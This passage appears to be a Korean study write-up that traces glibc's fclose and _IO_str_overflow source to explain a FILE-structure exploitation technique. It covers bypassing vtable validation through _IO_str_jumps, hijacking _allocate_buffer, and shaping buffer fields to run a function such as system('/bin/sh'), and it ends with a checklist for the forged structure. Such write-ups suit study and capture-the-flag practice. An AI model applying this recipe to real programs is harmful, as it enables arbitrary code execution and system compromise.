      __gconv_release_step (cc->__cd_out.__cd.__steps);
      __libc_lock_unlock (__gconv_lock);
    }
  else
    {
      if (_IO_have_backup (fp))
	_IO_free_backup_area (fp);
    }
  if (fp != _IO_stdin && fp != _IO_stdout && fp != _IO_stderr)
    {
      fp->_IO_file_flags = 0;
      free(fp);
    }

  return status;
}

versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);
strong_alias (_IO_new_fclose, __new_fclose)
versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);
```

`fclose()` = `_IO_new_fclose()`  

`fp` 구조체 `_IO_file_flags` 멤버(플래그)가 `_IO_IS_FILEBUF`(0x2000) 설정 되어 있으면 `_IO_file_close_it()` 함수 호출  
<br>

---

```c
int
_IO_new_file_close_it (_IO_FILE *fp)
{
  int write_status;
  if (!_IO_file_is_open (fp))
    return EOF;

  if ((fp->_flags & _IO_NO_WRITES) == 0
      && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)
    write_status = _IO_do_flush (fp);
  else
    write_status = 0;

  _IO_unsave_markers (fp);

  int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
		      ? _IO_SYSCLOSE (fp) : 0);

  /* Free buffer. */
  if (fp->_mode > 0)
    {
      if (_IO_have_wbackup (fp))
	_IO_free_wbackup_area (fp);
      _IO_wsetb (fp, NULL, NULL, 0);
      _IO_wsetg (fp, NULL, NULL, NULL);
      _IO_wsetp (fp, NULL, NULL);
    }
  _IO_setb (fp, NULL, NULL, 0);
  _IO_setg (fp, NULL, NULL, NULL);
  _IO_setp (fp, NULL, NULL);

  _IO_un_link ((struct _IO_FILE_plus *) fp);
  fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
  fp->_fileno = -1;
  fp->_offset = _IO_pos_BAD;

  return close_status ? close_status : write_status;
}
libc_hidden_ver (_IO_new_file_close_it, _IO_file_close_it)
```

`_IO_file_close_it()` = `_IO_new_file_close_it`  

`fp->_flags2` & `_IO_FLAGS2_NOCLOSE`(32 = 0x20)가 설정되어 있지 않아야 `_IO_SYSCLOSE()` 호출  
<br>

---

```c
// /libio/libioP.h

#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

...

#define _IO_JUMPS_FILE_plus(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)

...

# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))

...

#define JUMP0(FUNC, THIS) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS)

...

#define _IO_SYSCLOSE(FP) JUMP0 (__close, FP)

...

struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

`fp`에서 `vtable` 포인터를 꺼내고 그 안 특정 오프셋에 있는 함수 포인터를 호출하는 과정  

`_IO_SYSCLOSE(FP)`  
`JUMP0(__close,FP)`  
`(_IO_JUMPS_FUNC(FP)->__close)(__close)`  

`IO_validate_vtable(*(struct _IO_jump_t **)((void *) &_IO_JUMPS_FILE_plus (FP) + FP->_vtable_offset))`  
복잡하니 간단하게 나타내보면 `IO_validate_vtable(&_IO_JUMPS_FILE_plus(FP) + FP->_vtable_offset)`  
<br>

---

```c
// /libio/libioP.h

struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

`_IO_JUMPS_FILE_plus(FP)`는 `_IO_FILE_plus` 구조체 형식으로 FP를 파싱 후 `vtable`의 주소를 반환한다  

그러니까 `IO_validate_vtable(&_IO_JUMPS_FILE_plus(FP) + FP->_vtable_offset)`는 다시 `IO_validate_vtable(vtable)`으로 간단하게 표현할 수 있다  
<br>

---

```c
// /libio/libioP.h

static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  const char *ptr = (const char *) vtable;
  uintptr_t offset = ptr - __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

`_IO_validate_vtable`은 `vtable`을 검증하는 함수인데 `vtable`이 `libc_IO_vtables` 범위 안에 있는지 확인한다  
때문에 임의로 다른 공간에 `vtable` 구조를 만들고 그 주소를 `_IO_validate_vtable`에 넘겼다면 오류가 발생하게 된다  

이를 우회하기 위해서 `_IO_validate_vtable` 안에 있는 `vtable` 중 취약한 것을 찾아 사용하면 된다  
`fp` 구조체 조작 후 뒤에 붙어 있는 (`_IO_FILE` 구조체 뒤에 붙어 있는) vtable 포인터를 조작한다  
<br>

---

```c
// /libio/strops.c

const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

그 중 하나가 `_IO_str_jumps` vtable이다  
여기서 `_IO_str_overflow()`를 활용하게 된다  

이 외에도 `_IO_str_finish()`,  
`_IO_wstr_jumps` vtable의 `_IO_wstr_overflow()`, `_IO_wstr_finish()`를 사용할 수도 있다고 한다  
<br>

---

```c
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
libc_hidden_def (_IO_str_overflow)
```

`new_buf`가 정의될 때 취약하게 작동하는데 그 전까지에 있는 조건문들을 맞춰줘야 한다  

`fp->_flags`에 `_IO_NO_WRITES`(8=0x8) 설정이 되어 있지 않아야 함  
`fp->_flags`에 `_IO_TIED_PUT_GET`(0x400)이 설정되어 있지 않거나 `_IO_CURRENTLY_PUTTING`(0x800)이 설정되어 있어야 함  
`fp->flags`에 `_IO_USER_BUF`(1=0x1)가 설정되어 있지 않아야 함  
<br>

---

```c
new_buf
  = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
```

이렇게 맞추면 `new_buf`를 정의하는 부분까지 올 수 있게 된다  

왜 `new_buf`냐 하면 이게 정의될 때 `fp`를 조작해서 함수에 인자를 주어 실행시킬 수 있기 때문이다  
`fp`의 `_s.allocate_buffer` 멤버에 있는 함수 포인터를 `new_size` 인자와 함께 실행시킨다  
<br>

---

```c
// /libio/strfile.h

typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

...

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
```

근데 `fp`가 `_IO_strfile` 구조체로 파싱되기 때문에 위 코드를 참고해서 구조를 맞춰서 `fp` 구조체를 조작해주면 된다  

`_s` 멤버는 `_IO_FILE_plus` 구조체와 구조가 같은 `_IO_streambuf` 구조체 바로 뒤에 있으므로 `vtable` 뒤에 있게 되는 것을 알 수 있다  
`_s.allocate_buffer` 또한 첫 번째 멤버이기에 `_s` 위치와 같다  

그러면 이 곳에 실행하고픈 함수 포인터의 주소를 넣으면 원하는 함수를 실행할 수 있게 된다  
(`_IO_FILE` 구조체 조작 후 구조체 뒤에 (`vtable` 주소 8바이트) + (원하는 함수 포인터 주소))
<br>

---

```c
// /libio/libioP.h
#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
```
```c
// /libio/strops.h

size_t old_blen = _IO_blen (fp);
_IO_size_t new_size = 2 * old_blen + 100;
```

그러면 이제 원하는 함수에 주고픈 인자를 설정해야 한다  
아까 인자로 `new_size`가 들어갔는데 `new_size`의 계산 과정을 보면 `old_blen`에 2를 곱하고 100을 더한 값이다  

`old_blen`은 또 뭔가 했더니 다행히 간단하게 `_IO_buf_end` - `_IO_buf_base`를 한 값이다  

`new_size` => "/bin/sh"  
`old_blen` = `_IO_buf_end`-`_IO_buf_base` = ("/bin/sh"주소 - 100) / 2
<br>

---

```c
pos = fp->_IO_write_ptr - fp->_IO_write_base;
if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
  {
    if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
return EOF;
    else
```

그 전에 이 맞춰줘야 한다   
뭔가 며칠에 걸쳐서 글을 쓰다 보니 흐름도 이상하고 설명도 이상해진 느낌이다.. 이렇게 보는 것보다 직접 해보는 게 이해하기 쉽고 빠르니까 흐름만 파악하고 직접 해보기를 추천한다  

아무튼 `_IO_write_ptr`-`_IO_write_base`가 `_IO_buf_end`-`_IO_buf_base` 보다 크거나 같아야 한다..  
`flush_only`는 그냥 0이다  
간단하게 같게 만들어주면 된다  
<br>

---

정리하면  
- _flags -> 0000  
- _IO_write_ptr -> 인자  
- _IO_buf_end -> 인자와 같거나 개큰 값  
- _lock -> write 가능한 주소 (가끔 안 됨)  
- vtable -> 가짜 vtable 주소 / `_IO_str_jumps` vtable 맞추기  
- `_IO_str_overflow` 사용해서 임의 함수 실행  

<br>

---


